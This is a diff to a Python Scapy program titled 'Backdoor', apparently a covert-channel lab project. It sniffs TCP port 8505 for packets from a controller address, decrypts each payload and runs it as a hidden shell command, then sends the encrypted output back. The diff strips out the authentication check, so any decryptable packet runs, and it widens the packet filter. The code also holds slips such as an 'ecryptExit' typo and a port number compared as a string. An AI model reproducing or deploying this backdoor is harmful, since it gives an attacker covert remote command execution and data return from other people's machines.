@@ -30,10 +30,10 @@ def server(pkt):
     #Grab the source IP for each packets
     src_ip = pkt[IP].src
     dst_ip = pkt[IP].dst
-    print src_ip
     dst_port = pkt[TCP].dport
     print dst_port
-    if src_ip == "192.168.0.14":
+    print src_ip
+    if src_ip == "192.168.0.14" and dst_port == "8505":
         #Instantiate variables
         decryptedData=""
         newData = ""
@@ -42,36 +42,32 @@ def server(pkt):
         data = pkt[Raw].load
         #Decrypt the raw data
         decryptedData = crypt.decrypt(data)
-        #If the decrypted data is authenticated, print it
-        if decryptedData.startswith(authPacket) == True:
-            #Take out the authentication part
-            newData = decryptedData[20:]
-            #If we get exit command, exit out of the system
-            if newData == "exit":
-                encryptExit = crypt.encrypt(authPacket + newData)
-                pkt = IP(src="192.168.0.15", dst="192.168.0.14")/fuzz(TCP(dport=8505))/Raw(load=ecryptExit)
-                #Send the packet
-                send(pkt)
-                time.sleep(2)
-            else:
-                #Run the command using a child process so that it is hidden
-                process = subprocess.Popen(newData, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
-                #Store the output of the command into output variable
-                output = process.stdout.read() + process.stderr.read()
-                #Encrypt the output and add the packet authenticator before sending back
-                encryptedReply = crypt.encrypt(authPacket + output)
-                #Create the output packet
-                pkt = IP(src="192.168.0.15", dst="192.168.0.14")/TCP(dport=8505)/Raw(load=encryptedReply)
-                #Send the packet
-                send(pkt)
+        newData = decryptedData
+
+        #If we get exit command, exit out of the system
+        if newData == "exit":
+            encryptExit = crypt.encrypt(authPacket + newData)
+            pkt = IP(src="192.168.0.15", dst="192.168.0.14")/fuzz(TCP(dport=8505))/Raw(load=ecryptExit)
+            #Send the packet
+            send(pkt)
+            time.sleep(2)
         else:
-            print "test"
-            print decryptedData[20:]
+            #Run the command using a child process so that it is hidden
+            process = subprocess.Popen(newData, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
+            #Store the output of the command into output variable
+            output = process.stdout.read() + process.stderr.read()
+            #Encrypt the output and add the packet authenticator before sending back
+            encryptedReply = crypt.encrypt(output)
+            #Create the output packet
+            pkt = IP(src="192.168.0.15", dst="192.168.0.14")/TCP(dport=8505)/Raw(load=encryptedReply)
+            #Send the packet
+            send(pkt)
+
 
 if __name__ == "__main__":
     title = "Backdoor"
     setproctitle.setproctitle(title)
-    sniff(filter="tcp and host 192.168.0.14 and dst port 8505", prn=server)
+    sniff(filter="tcp and dst port 8505", prn=server)
 
 
 
